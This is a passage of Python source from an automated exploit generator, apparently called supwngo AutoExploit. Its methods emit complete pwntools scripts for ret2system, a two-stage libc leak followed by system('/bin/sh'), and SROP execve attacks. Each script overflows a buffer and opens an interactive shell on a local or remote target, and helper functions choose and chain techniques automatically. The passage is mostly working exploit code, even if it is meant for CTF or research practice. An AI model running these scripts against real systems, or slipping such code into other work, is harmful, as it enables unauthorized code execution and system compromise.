if __name__ == "__main__":
    exploit()
'''

    def _generate_ret2system_script(self, offset: int, system_addr: int, binsh_addr: int) -> str:
        """Generate ret2system exploit script."""
        pop_rdi = self._gadgets.get('pop_rdi', 0)
        ret = self._gadgets.get('ret', 0)

        return f'''#!/usr/bin/env python3
"""
ret2system Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

Calls system("/bin/sh") via PLT
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Addresses
    system_plt = {hex(system_addr)}
    binsh_addr = {hex(binsh_addr)}
    {"pop_rdi = " + hex(pop_rdi) if pop_rdi else "pop_rdi = 0  # TODO: Find pop rdi; ret gadget"}
    {"ret_gadget = " + hex(ret) if ret else "ret_gadget = 0  # TODO: Find ret gadget for alignment"}

    # Build payload
    offset = {offset}
    payload = b"A" * offset

    {"# 64-bit calling convention" if self.binary.bits == 64 else "# 32-bit calling convention"}
    {f'''payload += p64(ret_gadget)    # Stack alignment
    payload += p64(pop_rdi)       # pop rdi; ret
    payload += p64(binsh_addr)    # "/bin/sh"
    payload += p64(system_plt)    # system()''' if self.binary.bits == 64 else f'''payload += p32(system_plt)    # system()
    payload += p32(0xdeadbeef)    # fake return address
    payload += p32(binsh_addr)    # "/bin/sh"'''}

    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_leak_exploit_script(self) -> str:
        """Generate leak-and-exploit script template."""
        pop_rdi = self._gadgets.get('pop_rdi', 0)
        ret = self._gadgets.get('ret', 0)

        # Get some PLT/GOT entries
        puts_plt = self.binary.plt.get('puts', 0)
        puts_got = self.binary.got.get('puts', 0)
        main_addr = self.binary.symbols.get('main', 0)
        if hasattr(main_addr, 'address'):
            main_addr = main_addr.address

        return f'''#!/usr/bin/env python3
"""
Leak and Exploit Template for {self.binary.path.name}
Generated by supwngo AutoExploit

Two-stage exploit:
1. Leak libc address via GOT
2. Calculate libc base and call system("/bin/sh")
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0
LIBC = "{self.libc_path or ''}"  # Path to libc

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    libc = ELF(LIBC) if LIBC else None

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Gadgets
    {"pop_rdi = " + hex(pop_rdi) if pop_rdi else "pop_rdi = 0  # TODO: Find pop rdi; ret"}
    {"ret_gadget = " + hex(ret) if ret else "ret_gadget = 0  # TODO: Find ret gadget"}

    # PLT/GOT
    puts_plt = {hex(puts_plt) if puts_plt else "elf.plt['puts']"}
    puts_got = {hex(puts_got) if puts_got else "elf.got['puts']"}
    main_addr = {hex(main_addr) if main_addr else "elf.symbols['main']"}

    # TODO: Set correct offset
    offset = 0  # <-- FIND THIS

    # === Stage 1: Leak libc ===
    log.info("Stage 1: Leaking libc address...")

    payload1 = b"A" * offset
    payload1 += p64(pop_rdi)
    payload1 += p64(puts_got)
    payload1 += p64(puts_plt)
    payload1 += p64(main_addr)  # Return to main for stage 2

    io.sendline(payload1)

    # Parse leaked address
    io.recvuntil(b"\\n")  # Adjust based on binary output
    leak = u64(io.recv(6).ljust(8, b"\\x00"))
    log.success(f"Leaked puts@libc: {{hex(leak)}}")

    # Calculate libc base
    if libc:
        libc.address = leak - libc.symbols['puts']
        log.success(f"Libc base: {{hex(libc.address)}}")
        system = libc.symbols['system']
        binsh = next(libc.search(b"/bin/sh\\x00"))
    else:
        # Manual offsets (find with libc-database)
        # Example for libc6_2.31-0ubuntu9_amd64:
        # puts_offset = 0x84420
        # system_offset = 0x52290
        # binsh_offset = 0x1b45bd
        log.warning("No libc provided, using placeholder offsets")
        puts_offset = 0x0
        system_offset = 0x0
        binsh_offset = 0x0
        libc_base = leak - puts_offset
        system = libc_base + system_offset
        binsh = libc_base + binsh_offset

    # === Stage 2: Call system("/bin/sh") ===
    log.info("Stage 2: Calling system('/bin/sh')...")

    payload2 = b"A" * offset
    payload2 += p64(ret_gadget)   # Stack alignment
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    io.sendline(payload2)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_srop_script(self, offset: int, syscall_addr: int, pop_rax: int, binsh_addr: int) -> str:
        """Generate SROP exploit script."""
        return f'''#!/usr/bin/env python3
"""
SROP (Sigreturn-Oriented Programming) Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

Uses sigreturn to set all registers for execve syscall
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.arch = "{'amd64' if self.binary.bits == 64 else 'i386'}"
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Gadgets
    syscall_ret = {hex(syscall_addr)}
    pop_rax = {hex(pop_rax)}
    binsh_addr = {hex(binsh_addr)}

    # Build SROP frame
    frame = SigreturnFrame()
    frame.rax = 59           # execve syscall number
    frame.rdi = binsh_addr   # "/bin/sh"
    frame.rsi = 0            # argv = NULL
    frame.rdx = 0            # envp = NULL
    frame.rip = syscall_ret  # Continue to syscall

    # Build payload
    offset = {offset}
    payload = b"A" * offset
    payload += p64(pop_rax)
    payload += p64(15)           # SYS_rt_sigreturn
    payload += p64(syscall_ret)  # Trigger sigreturn
    payload += bytes(frame)

    log.info(f"Payload length: {{len(payload)}}")
    log.info(f"SROP frame size: {{len(bytes(frame))}}")

    io.send(payload)  # Use send(), not sendline() - no trailing newline
    io.interactive()

if __name__ == "__main__":
    exploit()
'''


# Convenience functions

def auto_exploit(binary: "Binary", **kwargs) -> AutoExploitReport:
    """
    Attempt automatic exploitation of binary.

    Args:
        binary: Target binary
        **kwargs: Options passed to AutoExploiter

    Returns:
        AutoExploitReport with results
    """
    exploiter = AutoExploiter(binary, **kwargs)
    return exploiter.run()


def generate_exploit_script(
    binary: "Binary",
    technique: str = None,
    offset: int = None,
    libc_path: str = None,
) -> str:
    """
    Generate exploit script for binary.

    Args:
        binary: Target binary
        technique: Specific technique (ret2win, shellcode, ret2system, srop)
        offset: Known buffer offset
        libc_path: Path to custom libc file

    Returns:
        Python exploit script as string
    """
    exploiter = AutoExploiter(binary, libc_path=libc_path)
    exploiter._analyze_binary()

    if offset:
        exploiter._offset = offset

    # Auto-detect best technique if not specified
    if technique is None:
        if exploiter._win_func:
            technique = "ret2win"
        elif not binary.protections.nx:
            technique = "shellcode"
        elif not getattr(binary.protections, 'static', False):
            technique = "ret2system"
        else:
            technique = "srop"

    # Generate appropriate script
    if technique == "ret2win" and exploiter._win_func:
        name, addr = exploiter._win_func
        return exploiter._generate_ret2win_script(
            exploiter._offset or 0, addr, name
        )
    elif technique == "shellcode":
        return exploiter._generate_shellcode_script(
            exploiter._offset or 0, exploiter._get_shellcode()
        )
    elif technique == "ret2system":
        system_plt = binary.plt.get('system', 0)
        binsh = exploiter._binsh_addr or 0
        if system_plt:
            return exploiter._generate_ret2system_script(
                exploiter._offset or 0, system_plt, binsh
            )
        else:
            return exploiter._generate_leak_exploit_script()
    elif technique == "srop":
        return exploiter._generate_srop_script(
            exploiter._offset or 0,
            exploiter._gadgets.get('syscall', 0),
            exploiter._gadgets.get('pop_rax', 0),
            exploiter._binsh_addr or 0
        )
    else:
        return exploiter._generate_leak_exploit_script()


def smart_auto_exploit(
    binary: "Binary",
    vulnerabilities: list = None,
    **kwargs,
) -> AutoExploitReport:
    """
    Smart automatic exploitation using technique chaining.

    Uses the ExploitChainer to analyze available primitives and
    build optimal exploitation chains.

    Args:
        binary: Target binary
        vulnerabilities: Optional list of detected vulnerabilities
        **kwargs: Options passed to AutoExploiter

    Returns:
        AutoExploitReport with results
    """
    from supwngo.exploit.chainer import ExploitChainer, suggest_techniques

    # First, use chainer to analyze and suggest techniques
    chainer = ExploitChainer(binary)
    chainer.analyze(vulnerabilities)

    # Get suggested techniques based on available primitives
    suggested = suggest_techniques(binary, goal="shell")

    logger.info(f"Chainer suggests: {suggested}")

    # Map chainer technique names to AutoExploiter technique names
    technique_map = {
        "ret2win": "ret2win",
        "ret2libc": "ret2system",
        "shellcode": "shellcode",
        "srop": "srop",
        "one_gadget": "ret2system",
        "fmt_write": "formatstring",
        "got_overwrite": "formatstring",
        "tcache_poison": "uaf",
        "fastbin_dup": "doublefree",
    }

    # Build technique order based on suggestions
    techniques = []
    for tech in suggested:
        if tech in technique_map:
            mapped = technique_map[tech]
            if mapped not in techniques:
                techniques.append(mapped)

    # Add remaining techniques
    remaining = ["ret2win", "formatstring", "shellcode", "ret2system", "srop"]
    for tech in remaining:
        if tech not in techniques:
            techniques.append(tech)

    logger.info(f"Technique order: {techniques}")

    # Run exploiter with optimized technique order
    exploiter = AutoExploiter(binary, **kwargs)
    return exploiter.run(techniques=techniques)


def get_exploitation_summary(binary: "Binary") -> dict:
    """
    Get a summary of exploitation possibilities for a binary.

    Args:
        binary: Target binary

    Returns:
        Dictionary with exploitation analysis
    """
    from supwngo.exploit.chainer import ExploitChainer

    chainer = ExploitChainer(binary)
    chainer.analyze()

    chains = chainer.build_chains()

    summary = {
        "binary": str(binary.path),
        "available_resources": list(chainer._available),
        "primitives_count": len(chainer._primitives),
        "possible_chains": len(chains),
        "best_chain": None,
        "success_probability": 0.0,
        "suggested_techniques": [],
    }

    if chains:
        best = chains[0]
        summary["best_chain"] = {
            "stages": [s.name for s in best.get_stages()],
            "notes": best.notes,
        }
        summary["success_probability"] = best.success_probability
        summary["suggested_techniques"] = [
            link.description for link in best.links
        ]

    return summary
